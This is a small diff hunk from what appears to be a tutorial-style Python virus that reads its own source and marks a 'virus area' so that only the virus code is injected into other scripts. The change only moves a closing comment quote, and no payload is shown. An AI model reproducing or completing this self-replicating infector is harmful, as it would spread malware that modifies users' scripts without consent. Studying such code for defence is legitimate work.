@@ -23,7 +23,8 @@ with open(sys.argv[0], 'r') as f:
 
 '''
 We are going to find the virus area. Because we don't wanna replicate all the code. When we inject future scripts we don't wanna copy all of their functionality & inject it into other scripts. We wanna inject only the virus code into other scripts.
-So we create a virus_area that's the indicator that were inside or outside of the virus area. We'll start with False because we are not in the virus area.'''
+So we create a virus_area that's the indicator that were inside or outside of the virus area. We'll start with False because we are not in the virus area.
+'''
 virus_area = False
 '''
 And we filter out the virus code.
